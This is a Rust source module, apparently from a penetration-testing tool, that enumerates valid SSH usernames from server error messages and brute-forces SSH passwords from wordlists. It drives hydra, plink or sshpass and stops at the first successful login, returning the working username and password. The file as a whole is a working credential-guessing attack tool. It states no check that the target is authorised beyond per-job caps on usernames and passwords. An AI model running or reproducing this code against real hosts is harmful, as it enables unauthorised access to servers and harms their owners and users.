use super::jobs::{finish_job, log_job, register_job, should_stop, update_progress, BruteJobResult};
use super::shell::{command_exists, run_timed_shell};
use super::wordlists::load_wordlist_lines;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::io::AsyncReadExt;
use tokio::net::TcpStream;
use tokio::time::{timeout, Duration};

fn temp_file(name: &str) -> PathBuf {
    std::env::temp_dir().join(name)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct UserEnumResult {
    pub username: String,
    pub likely_valid: bool,
    pub detail: String,
}

async fn grab_service_banner(host: &str, port: u16) -> Option<String> {
    let addr = format!("{host}:{port}");
    let mut stream = timeout(Duration::from_secs(4), TcpStream::connect(&addr))
        .await
        .ok()?
        .ok()?;
    let mut buf = [0u8; 512];
    let n = timeout(Duration::from_secs(3), stream.read(&mut buf))
        .await
        .ok()?
        .ok()?;
    if n == 0 {
        return None;
    }
    Some(String::from_utf8_lossy(&buf[..n]).trim().to_string())
}

pub async fn check_ssh_reachable(host: &str, port: u16) -> Result<String, String> {
    let addr = format!("{host}:{port}");
    match timeout(Duration::from_secs(4), TcpStream::connect(&addr)).await {
        Ok(Ok(_)) => {
            let banner = grab_service_banner(host, port).await;
            Ok(banner.unwrap_or_else(|| "SSH port open".to_string()))
        }
        Ok(Err(e)) => Err(format!("Cannot reach {addr}: {e}")),
        Err(_) => Err(format!("Connection to {addr} timed out")),
    }
}

pub async fn enumerate_ssh_users(
    host: String,
    port: u16,
    usernames: Vec<String>,
) -> Result<Vec<UserEnumResult>, String> {
    check_ssh_reachable(&host, port).await?;
    if usernames.is_empty() {
        return Err("No usernames to test".to_string());
    }
    if usernames.len() > 200 {
        return Err("Max 200 usernames per enumeration run".to_string());
    }

    let mut results = Vec::new();
    for user in usernames {
        let cmd = ssh_enum_command(&host, port, &user);
        let out = run_timed_shell(&cmd, 6).await.unwrap_or_default();
        let lower = out.to_lowercase();
        let likely_valid = !lower.contains("invalid user")
            && !lower.contains("user unknown")
            && !lower.contains("no such user")
            && (lower.contains("permission denied")
                || lower.contains("publickey")
                || lower.contains("password"));
        let detail = if likely_valid {
            "SSH accepts username (auth method reachable)".to_string()
        } else if lower.contains("timed out") {
            "Timed out".to_string()
        } else {
            "Likely invalid / not accepted".to_string()
        };
        results.push(UserEnumResult {
            username: user,
            likely_valid,
            detail,
        });
        tokio::time::sleep(Duration::from_millis(150)).await;
    }
    Ok(results)
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SshBruteParams {
    pub host: String,
    pub port: u16,
    pub username: Option<String>,
    pub username_wordlist_id: Option<String>,
    pub password_wordlist_id: String,
    pub threads: Option<u8>,
}

pub async fn start_ssh_bruteforce(params: SshBruteParams) -> Result<String, String> {
    check_ssh_reachable(&params.host, params.port).await?;

    let passwords = load_wordlist_lines(&params.password_wordlist_id).await?;
    if passwords.is_empty() {
        return Err("Password wordlist is empty".to_string());
    }

    let usernames: Vec<String> = if let Some(u) = params.username.clone() {
        vec![u]
    } else if let Some(wid) = &params.username_wordlist_id {
        load_wordlist_lines(wid).await?
    } else {
        return Err("Provide a username or username wordlist".to_string());
    };

    if usernames.is_empty() {
        return Err("No usernames to test".to_string());
    }
    if usernames.len() > 50 {
        return Err("Max 50 usernames per SSH brute job (use enumeration first)".to_string());
    }
    if passwords.len() > 10_000 {
        return Err("Max 10,000 passwords per job".to_string());
    }

    let total = (usernames.len() * passwords.len()) as u32;
    let target = format!("{}:{}", params.host, params.port);
    let (job_id, stop) = register_job("ssh", &target, total).await;
    let return_id = job_id.clone();

    let use_hydra = command_exists("hydra").await;
    #[cfg(target_os = "windows")]
    let has_plink = command_exists("plink").await;
    #[cfg(not(target_os = "windows"))]
    let has_plink = false;

    log_job(
        &job_id,
        &if use_hydra {
            "Using hydra (fast path) with per-attempt timeouts.".to_string()
        } else if has_plink {
            "Using PuTTY plink for password attempts on Windows.".to_string()
        } else {
            "hydra not found — falling back to ssh/sshpass (install OpenSSH + hydra on Windows for best results).".to_string()
        },
    )
    .await;

    tokio::spawn(async move {
        if use_hydra {
            run_ssh_hydra(&job_id, stop, params, usernames, passwords).await;
        } else {
            run_ssh_manual(&job_id, stop, params, usernames, passwords, has_plink).await;
        }
    });

    Ok(return_id)
}

async fn run_ssh_hydra(
    job_id: &str,
    stop: Arc<std::sync::atomic::AtomicBool>,
    params: SshBruteParams,
    usernames: Vec<String>,
    passwords: Vec<String>,
) {
    let total = (usernames.len() * passwords.len()) as u32;
    let user_file = temp_file(&format!("fulgul-users-{job_id}.txt"));
    let pass_file = temp_file(&format!("fulgul-pass-{job_id}.txt"));
    let out_file = temp_file(&format!("fulgul-hydra-{job_id}.txt"));

    let user_path = user_file.display();
    let pass_path = pass_file.display();
    let out_path = out_file.display();
    let _ = tokio::fs::write(&user_file, usernames.join("\n")).await;
    let _ = tokio::fs::write(&pass_file, passwords.join("\n")).await;

    let threads = params.threads.unwrap_or(4).min(8);
    let cmd = format!(
        "hydra -L \"{user_path}\" -P \"{pass_path}\" -t {threads} -W 3 -f -o \"{out_path}\" \
         ssh://{}:{} 2>&1",
        params.host, params.port
    );

    log_job(job_id, &format!("Running: hydra → {}:{}", params.host, params.port)).await;

    let hydra_handle = tokio::spawn(async move { run_timed_shell(&cmd, 600).await });

    let mut tried = 0u32;
    while !hydra_handle.is_finished() {
        if should_stop(&stop, job_id).await {
            let _ = run_timed_shell(&format!("pkill -f 'fulgul-hydra-{job_id}' 2>/dev/null"), 3).await;
            finish_job(job_id, "stopped", None).await;
            cleanup_temp(&user_file, &pass_file, &out_file).await;
            return;
        }
        tried = tried.saturating_add(1).min(total);
        update_progress(job_id, tried, total, "hydra running…").await;
        tokio::time::sleep(Duration::from_secs(2)).await;
    }

    let output = hydra_handle.await.ok().and_then(|r| r.ok()).unwrap_or_default();
    log_job(job_id, &output.lines().take(5).collect::<Vec<_>>().join("\n")).await;

    if let Ok(content) = tokio::fs::read_to_string(&out_file).await {
        for line in content.lines() {
            if line.contains("login:") || line.contains("password:") {
                let parts: Vec<&str> = line.split_whitespace().collect();
                let user = parts.get(2).map(|s| s.to_string());
                let pass = parts.get(3).map(|s| s.to_string());
                finish_job(
                    job_id,
                    "completed",
                    Some(BruteJobResult {
                        success: true,
                        credential: Some(line.to_string()),
                        username: user.clone(),
                        password: pass.clone(),
                        message: format!("SSH credentials found on {}:{}", params.host, params.port),
                    }),
                )
                .await;
                cleanup_temp(&user_file, &pass_file, &out_file).await;
                return;
            }
        }
    }

    if output.to_lowercase().contains("valid password found") {
        finish_job(
            job_id,
            "completed",
            Some(BruteJobResult {
                success: true,
                credential: Some(output.clone()),
                username: None,
                password: None,
                message: "Check hydra output for credentials".to_string(),
            }),
        )
        .await;
    } else {
        finish_job(
            job_id,
            "completed",
            Some(BruteJobResult {
                success: false,
                credential: None,
                username: None,
                password: None,
                message: "No valid SSH credentials in wordlists".to_string(),
            }),
        )
        .await;
    }
    cleanup_temp(&user_file, &pass_file, &out_file).await;
}

fn ssh_enum_command(host: &str, port: u16, user: &str) -> String {
    #[cfg(target_os = "windows")]
    {
        format!(
            "ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
             -o PreferredAuthentications=publickey -p {port} {user}@{host} exit 2>&1"
        )
    }
    #[cfg(not(target_os = "windows"))]
    {
        let esc_user = user.replace('\'', "'\\''");
        format!(
            "ssh -o BatchMode=yes -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
             -o PreferredAuthentications=publickey -p {port} '{esc_user}@{host}' exit 2>&1"
        )
    }
}

async fn run_ssh_manual(
    job_id: &str,
    stop: Arc<std::sync::atomic::AtomicBool>,
    params: SshBruteParams,
    usernames: Vec<String>,
    passwords: Vec<String>,
    has_plink: bool,
) {
    let total = (usernames.len() * passwords.len()) as u32;
    let mut tried = 0u32;
    let has_sshpass = command_exists("sshpass").await;

    for user in &usernames {
        for pass in &passwords {
            if should_stop(&stop, job_id).await {
                finish_job(job_id, "stopped", None).await;
                return;
            }
            tried += 1;
            update_progress(job_id, tried, total, &format!("{user}:{pass}")).await;

            let cmd = if has_plink {
                format!(
                    "plink -batch -pw \"{}\" -P {} {}@{} echo FULGUL_OK 2>&1",
                    pass.replace('"', "\\\""),
                    params.port,
                    user,
                    params.host
                )
            } else if has_sshpass {
                let esc_pass = pass.replace('\'', "'\\''");
                let esc_user = user.replace('\'', "'\\''");
                format!(
                    "sshpass -p '{esc_pass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=4 \
                     -o PreferredAuthentications=password -o PubkeyAuthentication=no \
                     -p {} '{esc_user}@{}' 'echo FULGUL_OK' 2>&1",
                    params.port, params.host
                )
            } else {
                format!(
                    "ssh -o BatchMode=yes -o ConnectTimeout=4 -o StrictHostKeyChecking=no \
                     -p {} {}@{} echo FULGUL_OK 2>&1",
                    params.port, user, params.host
                )
            };

            match run_timed_shell(&cmd, 8).await {
                Ok(out) if out.contains("FULGUL_OK") => {
                    log_job(job_id, &format!("✓ Valid: {user} / {pass}")).await;
                    finish_job(
                        job_id,
                        "completed",
                        Some(BruteJobResult {
                            success: true,
                            credential: Some(format!("{user}:{pass}")),
                            username: Some(user.clone()),
                            password: Some(pass.clone()),
                            message: "SSH login successful".to_string(),
                        }),
                    )
                    .await;
                    return;
                }
                Ok(out) => {
                    let lower = out.to_lowercase();
                    if lower.contains("connection refused") || lower.contains("no route") {
                        log_job(job_id, "Host unreachable — aborting.").await;
                        finish_job(
                            job_id,
                            "failed",
                            Some(BruteJobResult {
                                success: false,
                                credential: None,
                                username: None,
                                password: None,
                                message: out,
                            }),
                        )
                        .await;
                        return;
                    }
                }
                Err(e) if tried % 20 == 0 => log_job(job_id, &e).await,
                _ => {}
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }

    finish_job(
        job_id,
        "completed",
        Some(BruteJobResult {
            success: false,
            credential: None,
            username: None,
            password: None,
            message: "No valid SSH credentials found".to_string(),
        }),
    )
    .await;
}

async fn cleanup_temp(u: &PathBuf, p: &PathBuf, o: &PathBuf) {
    let _ = tokio::fs::remove_file(u).await;
    let _ = tokio::fs::remove_file(p).await;
    let _ = tokio::fs::remove_file(o).await;
}
